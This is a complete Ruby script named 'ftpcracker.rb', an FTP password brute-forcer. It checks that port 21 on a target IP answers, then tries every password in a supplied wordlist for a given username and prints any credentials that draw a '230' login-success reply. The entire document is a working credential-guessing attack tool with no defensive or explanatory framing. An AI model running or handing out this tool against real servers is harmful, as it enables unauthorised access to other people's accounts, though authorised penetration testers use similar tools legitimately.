#!/usr/bin/ruby

require "socket"
require "timeout"

unless ARGV.length == 3
	puts "Usage: ./ftpcracker.rb [TARGET IP] [USERNAME] [WORDLIST]"
	exit
end

$rhost = ARGV[0]
$username = ARGV[1]
$wordlist = ARGV[2]

def checkTarget()
	puts "[+] Checking Target... "
	begin
		s = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
		sockaddr = Socket.pack_sockaddr_in(21, $rhost)
		Timeout.timeout(10) do
			@result = s.connect(sockaddr)
		end	
		s.close
		if @result == 0
			puts "[+] Done."
		else
			raise "[-] Connection refused"
		end
	rescue 
		puts "[-] Fail!"
		exit
	end
end

def getWordlist(path)
	puts "[*] Reading Wordlist... "
	begin
		file = File.open(path, "r")
		$to_check = file.read.chomp.split("\n")
		file.close
		puts "[+] Wordlist Readed!"
	rescue
		puts "[-] Fail!"
		exit
	end
end

def crackPass(pass)
	puts "[+] Cracking Password..."
	begin
		s = TCPSocket.new($rhost, 21)
		s.gets
		s.puts("USER #{$username}")
		s.gets
		s.puts("PASS #{pass}")
		data = s.gets
		return false unless data.include? '230'
		return true
	rescue 
		return false
	end
end

# main

checkTarget()
getWordlist($wordlist)

puts "[*] Cracking FTP Password for #{$username} at #{$rhost}... \n\n"

$to_check.each do |pass|
	if crackPass(pass)
		puts "[*] Credentials Found:"
		puts "\tUsername: #{$username}"
		puts "\tPassword: #{pass}\n\n"

		break
	end
end

puts "[!] Cracking Complete!"